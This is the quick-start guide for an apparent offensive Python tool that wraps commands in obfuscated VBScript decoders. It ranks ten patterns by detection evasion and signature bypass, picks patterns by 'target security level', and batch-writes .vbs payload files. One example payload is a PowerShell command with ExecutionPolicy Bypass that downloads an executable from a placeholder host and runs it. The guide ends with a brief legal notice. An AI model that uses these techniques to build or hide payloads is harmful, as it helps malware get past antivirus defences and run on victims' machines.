# Array Decoder Patterns - Quick Start Guide

## Installation

No installation required! The module is pure Python.

```bash
# Verify it works
python array_decoder_patterns.py
```

## 30-Second Quick Start

### 1. Generate a Single Pattern

```python
from array_decoder_patterns import ArrayDecoderPatterns, DecoderPattern

generator = ArrayDecoderPatterns()
payload = "powershell.exe -Command Write-Host 'Success'"

# Generate one pattern
code = generator.generate_decoder(payload, DecoderPattern.POLYMORPHIC)
print(code)
```

### 2. Generate All 10 Patterns

```python
all_patterns = generator.generate_all_patterns(payload)

for pattern_name, vbs_code in all_patterns.items():
    print(f"\n{pattern_name}:")
    print(vbs_code)
```

### 3. Use Configuration Options

```python
from array_decoder_patterns import DecoderVariant

variant = DecoderVariant(
    pattern=DecoderPattern.POLYMORPHIC,
    chunk_size=32,           # Bytes per chunk (default 16)
    randomize_names=True     # Random variable names
)

code = generator.generate_decoder(payload, DecoderPattern.POLYMORPHIC, variant)
```

## Pattern Selection Guide

### Choose Based on Your Needs

| Need | Pattern | Why |
|------|---------|-----|
| **Speed** | Sequential | Smallest code, fastest execution |
| **Max Evasion** | Polymorphic | Multiple implementations |
| **Codec Variety** | Mixed Encoding | Switches between hex/base64 |
| **Data Structure** | Nested Array | Mimics legitimate data processing |
| **Hash Bypass** | Chunk Index | Uses Dictionary, breaks signatures |
| **Simple Variation** | Interleaved | Easy even/odd splitting |
| **Reverse Analysis** | Reverse Order | Backward processing |
| **Index Confusion** | Matrix Access | Computed modulo indices |
| **Subroutine Stack** | Split Decode | Function call separation |
| **Variable Hiding** | Obfuscated Var | Short individual variable names |

## Examples for Different Payloads

### Simple Command
```python
payload = "cmd /c dir"
code = generator.generate_decoder(payload, DecoderPattern.SEQUENTIAL)
```

### PowerShell Command
```python
payload = "powershell.exe -NoProfile -Command Get-Process"
code = generator.generate_decoder(payload, DecoderPattern.POLYMORPHIC)
```

### Long Command with Arguments
```python
payload = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('http://example.com/file.exe', 'C:\\Temp\\file.exe'); Start-Process 'C:\\Temp\\file.exe'\""
code = generator.generate_decoder(payload, DecoderPattern.MIXED_ENCODING)
```

## Common Patterns

### Generate and Save to File
```python
generator = ArrayDecoderPatterns()
payload = "cmd /c dir"
code = generator.generate_decoder(payload, DecoderPattern.POLYMORPHIC)

with open("payload.vbs", "w") as f:
    f.write(code)
```

### Generate All Patterns and Compare
```python
import json

generator = ArrayDecoderPatterns()
payload = "cmd /c dir"
results = generator.generate_all_patterns(payload)

comparison = {
    pattern: {
        "code_size": len(code),
        "lines": len(code.split('\n')),
        "has_functions": "Function" in code,
        "has_dictionary": "Dictionary" in code,
    }
    for pattern, code in results.items()
}

print(json.dumps(comparison, indent=2))
```

### Generate with Random Names
```python
from array_decoder_patterns import DecoderVariant, DecoderPattern

generator = ArrayDecoderPatterns()
payload = "cmd /c calc.exe"

# Generate 5 unique versions of the same pattern
for i in range(5):
    variant = DecoderVariant(
        pattern=DecoderPattern.POLYMORPHIC,
        randomize_names=True  # Random names each time
    )
    code = generator.generate_decoder(payload, DecoderPattern.POLYMORPHIC, variant)
    print(f"\nVersion {i+1}:")
    print(code[:200])  # First 200 chars
```

## Testing & Validation

### Run All Tests
```bash
python test_array_decoder_patterns.py
```

Expected output:
```
Ran 27 tests in 0.005s
OK
✓ ALL TESTS PASSED
```

### Run Interactive Demo
```bash
python array_decoder_patterns_demo.py
```

Shows:
- All 10 patterns in detail
- Code size comparison
- Feature analysis
- Pattern variations

## Pattern Quick Reference

### By Complexity (Simplest to Most Complex)
1. Sequential - Basic For loop
2. Reverse Order - Simple Step -1
3. Interleaved - Two For loops with Step 2
4. Matrix Access - For loop with modulo
5. Obfuscated Var - Multiple variables
6. Nested Array - 2D array with nested loops
7. Split Decode - Function with two calls
8. Chunk Index - Dictionary objects
9. Mixed Encoding - Dual codecs + conditions
10. Polymorphic - Multiple functions + Select/Case

### By Code Size (Smallest to Largest)
1. Obfuscated Var - ~360B
2. Sequential - ~440B
3. Reverse Order - ~500B
4. Matrix Access - ~590B
5. Split Decode - ~620B
6. Nested Array - ~650B
7. Chunk Index - ~660B
8. Interleaved - ~740B
9. Mixed Encoding - ~820B
10. Polymorphic - ~1150B

### By Detection Evasion (Best to Least)
1. Polymorphic - Highest (multiple implementations)
2. Mixed Encoding - High (codec switching)
3. Chunk Index - High (breaks numeric access)
4. Matrix Access - Medium (computed indices)
5. Nested Array - Medium (data structure)
6. Split Decode - Medium (subroutines)
7. Interleaved - Medium (flow variation)
8. Reverse Order - Medium (direction)
9. Obfuscated Var - Low (name obfuscation)
10. Sequential - Low (baseline)

## Advanced Usage

### Custom Chunk Sizes
```python
from array_decoder_patterns import DecoderVariant

# Larger chunks
variant = DecoderVariant(pattern=DecoderPattern.SEQUENTIAL, chunk_size=64)
code = generator.generate_decoder(payload, DecoderPattern.SEQUENTIAL, variant)

# Smaller chunks
variant = DecoderVariant(pattern=DecoderPattern.SEQUENTIAL, chunk_size=8)
code = generator.generate_decoder(payload, DecoderPattern.SEQUENTIAL, variant)
```

### Batch Generation
```python
payloads = [
    "cmd /c dir",
    "powershell.exe -Command Get-Process",
    "calc.exe"
]

for payload in payloads:
    all_patterns = generator.generate_all_patterns(payload)
    for pattern_name, code in all_patterns.items():
        with open(f"{pattern_name}_{payloads.index(payload)}.vbs", "w") as f:
            f.write(code)
```

### Dynamic Pattern Selection
```python
def select_pattern_for_environment(target_security_level):
    """Select evasion pattern based on target"""
    if target_security_level == "critical":
        return DecoderPattern.POLYMORPHIC
    elif target_security_level == "high":
        return DecoderPattern.MIXED_ENCODING
    elif target_security_level == "medium":
        return DecoderPattern.NESTED_ARRAY
    else:
        return DecoderPattern.SEQUENTIAL

pattern = select_pattern_for_environment("high")
code = generator.generate_decoder(payload, pattern)
```

## Troubleshooting

### "Module not found" error
```bash
# Make sure you're in the right directory
cd /home/user/sc-generator

# Run directly
python array_decoder_patterns.py
```

### Import errors
```python
# Ensure imports are correct
from array_decoder_patterns import ArrayDecoderPatterns
from array_decoder_patterns import DecoderPattern
from array_decoder_patterns import DecoderVariant
```

### VBS code won't execute
- Ensure payload is a valid executable (cmd.exe, powershell.exe, etc.)
- Test with simple commands first: `cmd /c dir`
- Check that WScript.Shell is available on target system

## Performance Tips

1. **For speed:** Use `DecoderPattern.SEQUENTIAL` (smallest code)
2. **For evasion:** Use `DecoderPattern.POLYMORPHIC` (best variety)
3. **For balance:** Use `DecoderPattern.MIXED_ENCODING` or `NESTED_ARRAY`
4. **For custom:** Use `chunk_size=64` for larger payloads

## Integration Examples

### With VBSEncoder
```python
from vbs_encoder import VBSEncoder
from array_decoder_patterns import ArrayDecoderPatterns, DecoderPattern

# Original encoder
encoder = VBSEncoder()
vbs1 = encoder.create_array_concatenation_decoder(payload)

# New patterns
patterns = ArrayDecoderPatterns()
vbs2 = patterns.generate_decoder(payload, DecoderPattern.POLYMORPHIC)
```

### Save Multiple Formats
```python
generator = ArrayDecoderPatterns()
payload = "cmd /c dir"

# VBS file
with open("command.vbs", "w") as f:
    f.write(generator.generate_decoder(payload, DecoderPattern.SEQUENTIAL))

# PowerShell wrapper
ps_wrapper = f'powershell -ExecutionPolicy Bypass -File command.ps1 -Command "{generator.generate_decoder(payload, DecoderPattern.POLYMORPHIC)}"'
```

## Resources

- **Full Reference:** `ARRAY_DECODER_PATTERNS_REFERENCE.md`
- **Summary:** `ARRAY_DECODER_PATTERNS_SUMMARY.md`
- **Tests:** `test_array_decoder_patterns.py` (27 tests, 100% pass)
- **Demo:** `array_decoder_patterns_demo.py` (Interactive showcase)
- **Source:** `array_decoder_patterns.py` (Core implementation)

## Legal Notice

These patterns are for **authorized security research only**:
- ✓ Authorized penetration testing
- ✓ Security research
- ✓ Red team exercises (with authorization)
- ✓ Educational purposes

**Not for:**
- ✗ Unauthorized system access
- ✗ Malware distribution
- ✗ Illegal activities

---

**Need Help?**
1. Check `ARRAY_DECODER_PATTERNS_REFERENCE.md` for detailed docs
2. Run `python test_array_decoder_patterns.py` to verify installation
3. Run `python array_decoder_patterns_demo.py` for examples
4. Review source code in `array_decoder_patterns.py`
